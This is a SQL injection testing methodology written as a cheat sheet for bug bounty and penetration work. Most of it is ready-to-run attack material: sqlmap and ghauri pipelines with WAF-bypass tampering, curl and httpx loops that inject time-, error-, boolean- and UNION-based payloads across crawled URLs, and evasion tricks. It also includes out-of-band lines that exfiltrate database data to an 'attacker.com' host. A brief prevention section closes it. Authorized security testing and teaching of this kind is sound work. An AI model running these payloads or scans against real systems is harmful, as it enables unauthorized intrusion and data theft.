# SQL Injection (SQLi)

> Comprehensive SQL injection testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

SQL Injection occurs when untrusted user input is concatenated directly into SQL queries, allowing attackers to manipulate database logic, extract data, modify records, or execute commands. This guide covers modern SQLi testing methodology, tools, and bypass techniques based on OWASP SQL Injection Prevention Cheat Sheet, PortSwigger SQL Injection Cheat Sheet, and recent WAF bypass trends.

## SQL Injection Types

| Type | Description | Testing Focus |
|------|-------------|---------------|
| **Error-based SQLi** | Force verbose error messages revealing database structure | Single quotes (`'`), double quotes (`"`), parentheses |
| **Union-based SQLi** | Append `UNION SELECT` to extract data | Determine column count, data types |
| **Boolean-based blind SQLi** | Infer data via true/false response differences | `AND 1=1`, `AND 1=2`, substring checks |
| **Time-based blind SQLi** | Infer data via response time delays | `SLEEP(5)`, `WAITFOR DELAY`, conditional delays |
| **Out-of-band (OOB) SQLi** | Exfiltrate data via DNS/HTTP requests | `LOAD_FILE`, `xp_dirtree`, `UTL_INADDR` |
| **Stacked queries** | Execute multiple SQL statements | `'; DROP TABLE users; --` |

## Methodology

### 1. Target & Input Identification
- **Common vulnerable parameter patterns:** `id=`, `select=`, `report=`, `role=`, `update=`, `query=`, `user=`, `name=`, `sort=`, `where=`, `search=`, `params=`, `process=`, `row=`, `view=`, `table=`, `from=`, `sel=`, `results=`, `sleep=`, `fetch=`, `order=`, `keyword=`, `column=`, `field=`, `delete=`, `string=`, `number=`, `filter=`
- **Additional input sources:** Search boxes, login forms, URL parameters, registration/profile update forms, AJAX/API endpoints, hidden fields, multipart forms, file metadata, cookies, headers (`User-Agent`, `Referer`, `X-Forwarded-For`, `X-Real-IP`)
- **Database fingerprinting:** Identify DBMS (MySQL, PostgreSQL, Oracle, MSSQL, SQLite) via error messages, version queries, syntax differences

### 2. Tool Installation & Setup

```bash
# Install SQLi testing tools
pip3 install sqlmap                                # Automated SQL injection tool
go install github.com/r0oth3x49/ghauri@latest      # Modern SQLi scanner with WAF bypass
go install github.com/tomnomnom/waybackurls@latest # Historical URL extraction
go install github.com/tomnomnom/qsreplace@latest   # Query string replacement
go install github.com/tomnomnom/gf@latest          # Pattern matching
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest  # HTTP toolkit
go install github.com/ffuf/ffuf@latest             # Fuzzing for boolean-based detection
```

### 3. Parameter Extraction & Enumeration

```bash
# Extract URLs with parameters from crawl results
gf sqli crawledurls.txt > gf-sqli.txt

# Extract parameters from JavaScript files
cat jsfiles.txt | grep -Eo "(var|let|const)\s+\w+\s*=\s*['\"].*?['\"]" | cut -d'=' -f2 | tr -d " '\"" | sort -u > js-params.txt

# Extract URLs from Wayback Machine
waybackurls target.com | grep -E '\?' | uro | tee wayback-sqli.txt

# Filter for SQLi-prone parameters
cat all-urls.txt | grep -E "(id=|select=|user=|name=|search=|query=|report=|role=|update=|table=|from=|where=|order=|sort=|filter=|limit=|offset=)" > sqli-candidates.txt
```

### 4. GF Pattern Matching for SQLi

```bash
# Filter potential SQLi vectors using gf patterns
gf sqli paramurls.txt > gf-sqli.txt

# Custom pattern for numeric IDs
gf id paramurls.txt > numeric-ids.txt
```

### 5. Automated SQLMap Testing

```bash
# Basic SQLMap scan with error detection
cat gf-sqli.txt | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2 | tee -a sqli-report.txt

# Advanced SQLMap with tampering for WAF bypass
cat https-subs.txt | (gau || hakrawler || katana || waybackurls) | grep -E '\?' | uro | httpx -silent -mc 200,301,302,307,308 -t 50 | sort -u | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs --tamper=space2comment,randomcase,between,charencode,equaltolike --threads=5 --proxy=http://127.0.0.1:8080 | tee -a sqli-report.txt

# Targeted scan for specific parameter
sqlmap -u "https://target.com/product?id=1" --batch --dbs --tamper=space2comment,randomcase --technique=BEUST --time-sec=5

# Batch scan with custom payloads
sqlmap -m sqli.txt --batch --tamper=between,charencode,randomcase --technique=BEUSTQ --dbms=mysql --prefix="'" --suffix="-- -"
```

### 6. Manual Testing with Curl & Custom Payloads

```bash
# Test for error-based SQLi
curl -s "https://target.com/product?id=1'" | grep -i "error\|sql\|syntax\|mysql\|postgresql\|oracle\|mssql"

# Test for boolean-based blind SQLi
curl -s "https://target.com/product?id=1 AND 1=1" && curl -s "https://target.com/product?id=1 AND 1=2"

# Test for time-based blind SQLi
time curl -s "https://target.com/product?id=1' AND SLEEP(5)-- -" > /dev/null

# Test UNION-based SQLi
curl -s "https://target.com/product?id=1 UNION SELECT NULL,NULL,NULL-- -" | grep -i "null\|error\|sql"

# Test with encoding bypass
curl -sG "https://target.com/search" --data-urlencode "q=1' OR '1'='1" | grep -i "error\|sql"
```

### 7. Error-Based Detection

```bash
# Detect SQL errors in responses
cat gf-sqli.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mysql|postgresql|oracle|mssql|database" | anew sqli-errors.txt

# Test with database-specific error triggers
cat gf-sqli.txt | qsreplace "1' AND CAST(@@version AS INT)--" | httpx -silent -mr "version\|convert\|cast" -mc 500
```

### 8. Time-Based Blind Detection

```bash
# Detect time delays indicating blind SQLi
cat gf-sqli.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx -silent -timeout 10 | anew time-based.txt

# Database-specific time delays
# MySQL
cat gf-sqli.txt | qsreplace "1' AND SLEEP(5)#" | httpx -silent -timeout 10
# PostgreSQL
cat gf-sqli.txt | qsreplace "1' AND pg_sleep(5)--" | httpx -silent -timeout 10
# MSSQL
cat gf-sqli.txt | qsreplace "1' WAITFOR DELAY '0:0:5'--" | httpx -silent -timeout 10
# Oracle
cat gf-sqli.txt | qsreplace "1' AND (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3) > 0--" | httpx -silent -timeout 10
```

### 9. Boolean-Based Blind Detection

```bash
# Detect response differences for boolean conditions
cat gf-sqli.txt | qsreplace "1' AND '1'='1" | httpx -silent -mc 200 -ms "welcome\|success\|found" | anew boolean-true.txt
cat gf-sqli.txt | qsreplace "1' AND '1'='2" | httpx -silent -mc 200 -ms "error\|not found\|invalid" | anew boolean-false.txt

# Compare response lengths
curl -s "https://target.com/product?id=1 AND 1=1" | wc -c
curl -s "https://target.com/product?id=1 AND 1=2" | wc -c
```

### 10. UNION Detection

```bash
# Detect UNION injection vulnerabilities
cat gf-sqli.txt | gf sqli | qsreplace "1 UNION SELECT NULL,NULL,NULL-- -" | httpx -silent -mc 200

# Find column count
for i in {1..20}; do echo "Testing $i columns"; cat gf-sqli.txt | qsreplace "1 UNION SELECT $(printf 'NULL,'*$i | sed 's/,$//')-- -" | httpx -silent -mc 200 -mr "NULL" | head -5; done
```

### 11. Ghauri Scan (Modern SQLi Scanner)

```bash
# Basic scan
cat gf-sqli.txt | xargs -I@ ghauri -u @ --batch --level 3

# Advanced scan with WAF bypass
ghauri -u "https://target.com/product?id=1" --batch --technique=BEUSTQ --tamper=randomcase,space2comment --dbms=mysql --dbs

# Batch scanning
ghauri -l gf-sqli.txt --batch --threads 5 --dbs --tamper=between,charencode

while IFS= read -r url; do
    echo -e "\n\n====================\nTesting: $url\n===================="
    ghauri -u "$url" --batch --threads 5 --dbs --level=3 --flush-session
done < gf-sqli.txt | tee ghauri-results.txt
```

### 12. NoSQL Injection Testing

```bash
# Test for MongoDB injection
curl -X POST "https://target.com/api/search" -H "Content-Type: application/json" -d '{"username": {"$ne": null}}'

# Test for JSON-based injection
curl -X POST "https://target.com/api/filter" -H "Content-Type: application/json" -d '{"filter": {"$where": "1==1"}}'
```

## Advanced Techniques (2025–2026 Trends)

### WAF Bypass Techniques
- **No-space / comment tricks:** `/**/`, `/*!*/`, `/* */`, `id=1+AND+1=1`
- **Case & keyword variation:** `SeLeCt`, `uNiOn SeLeCt`, `AnD`, `oR`
- **Encoding / obfuscation:** URL: `%27`, `%2527` (double), Hex: `0x27`, Char: `CHAR(39)`
- **JSON / API bypass:** Send payloads in JSON body: `{"id": "1' OR '1'='1"}`, Nested: `{"filter": {"$eq": ["1", "1' UNION SELECT..."]}}`
- **Tamper-style:** `1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)`, `1'||(SELECT '')||'`, `1' /*!50000AND*/ '1'='1`
- **Exotic / recent:** Unicode: `’` (curly quote), Overlong UTF-8, Parameter smuggling + SQLi, Header-based: `X-Forwarded-For: ' OR 1=1 --`

### Database-Specific Payloads
- **MySQL:** `' OR 1=1-- -`, `' UNION SELECT @@version,user(),database()-- -`
- **PostgreSQL:** `' OR 1=1--`, `' UNION SELECT version(),current_user,current_database()--`
- **MSSQL:** `' OR 1=1--`, `' UNION SELECT @@version,user_name(),db_name()--`
- **Oracle:** `' OR 1=1--`, `' UNION SELECT banner,user FROM v$version--`
- **SQLite:** `' OR 1=1--`, `' UNION SELECT sqlite_version(),1,1--`

### Out-of-Band (OOB) Data Exfiltration
- **DNS exfiltration:** `LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\'))`
- **HTTP exfiltration:** `SELECT LOAD_FILE(CONCAT('http://attacker.com/', (SELECT @@version)))`
- **XML external entity:** `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/">%remote;]>'),'/l') FROM dual`

### Second-Order SQL Injection
- Test stored inputs later used in queries (user registration → profile display)
- Payload: `admin'--` in registration, later used in `SELECT * FROM users WHERE username='admin'--'`

## Prevention & Defense (Developer Perspective)

### Primary Defenses
1. **Prepared Statements (Parameterized Queries):** Use `?` placeholders, bind variables
2. **Stored Procedures:** With parameter validation, no dynamic SQL
3. **Allow-list Input Validation:** Whitelist allowed values for table/column names
4. **Escaping User Input:** Last resort, database-specific escaping functions

### Database-Specific Protection
- **MySQL:** `mysqli_real_escape_string()`, PDO with prepared statements
- **PostgreSQL:** `pg_escape_string()`, `PQescapeLiteral()`
- **MSSQL:** `sqlsrv_prepare()`, `SQLSRV_PHPTYPE_STRING`
- **Oracle:** `DBMS_ASSERT.ENQUOTE_LITERAL()`, `DBMS_ASSERT.ENQUOTE_NAME()`
- **SQLite:** `sqlite3_prepare_v2()`, `sqlite3_bind_text()`

### Additional Defenses
- **Least Privilege:** Database accounts with minimal permissions
- **Input Validation:** Type, length, format, range validation
- **Web Application Firewall (WAF):** As secondary layer, not primary defense
- **Error Handling:** Generic error messages, no database details
- **Regular Updates:** Patch database software and libraries

### Security Headers
```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## References

- **PortSwigger SQL Injection Cheat Sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet
- **OWASP SQL Injection Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- **PayloadsAllTheThings – SQL Injection:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- **Advanced SQL Injection Cheatsheet:** https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
- **SQLMap Documentation:** https://github.com/sqlmapproject/sqlmap/wiki
- **Ghauri Documentation:** https://github.com/r0oth3x49/ghauri
- **Web-Vulnerability-Testing-Checklist SQL-Injection.md:** ../Web-Vulnerability-Testing-Checklist/SQL-Injection.md

## Tool References
- **SQLMap:** https://github.com/sqlmapproject/sqlmap
- **Ghauri:** https://github.com/r0oth3x49/ghauri
- **NoSQLMap:** https://github.com/codingo/NoSQLMap
- **DSSS (Damn Small SQLi Scanner):** https://github.com/stamparm/DSSS

---

**Happy (ethical) hunting — SQLi remains a critical vulnerability with high impact and rewards in bug bounty programs!**
